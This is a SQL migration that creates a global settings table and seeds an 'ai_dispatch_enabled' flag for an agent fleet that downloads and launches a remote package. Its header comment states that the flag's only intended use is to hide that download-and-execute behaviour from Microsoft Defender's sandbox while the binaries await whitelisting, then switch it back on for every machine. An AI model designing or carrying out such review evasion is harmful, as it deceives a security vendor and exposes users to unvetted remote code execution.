-- 012_system_settings — Global feature flags table.
--
-- The first flag is `ai_dispatch_enabled`. When TRUE (the default and
-- normal-operation state), the heartbeat handler embeds the active AI
-- package URL + entrypoint in the response and tells the agent to
-- launch when ready. When FALSE, the heartbeat strips all AI metadata
-- and never sets launch_ai=true, so agents will not download or spawn
-- the AI client.
--
-- The exclusive use-case for FALSE: while submitting Smartcore.exe and
-- setup.exe to the Microsoft Defender Submission Portal for whitelist
-- consideration. Microsoft runs the binaries in a sandbox; with the
-- flag off they observe a plain agent that just heartbeats — no AI
-- bundle is fetched, no extracted/ tree appears, no entrypoint
-- spawns. Once Microsoft greenlights the binaries, flip the flag back
-- to TRUE and the entire fleet picks up AI on the next 60s heartbeat.
--
-- Schema is a generic singleton-style settings table so future global
-- flags (e.g. video_dispatch_enabled, command_dispatch_enabled) can
-- live in the same place without further migrations. Rows are
-- identified by a string key; values are JSONB so we can store
-- complex shapes if needed (timestamps, arrays, sub-objects).

CREATE TABLE IF NOT EXISTS system_settings (
    key         TEXT        PRIMARY KEY,
    value       JSONB       NOT NULL,
    updated_at  TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
    updated_by  UUID        REFERENCES admin_users(id)
);

-- Seed the AI dispatch flag = enabled. Idempotent — re-running the
-- migration is a no-op.
INSERT INTO system_settings (key, value)
VALUES ('ai_dispatch_enabled', 'true'::jsonb)
ON CONFLICT (key) DO NOTHING;
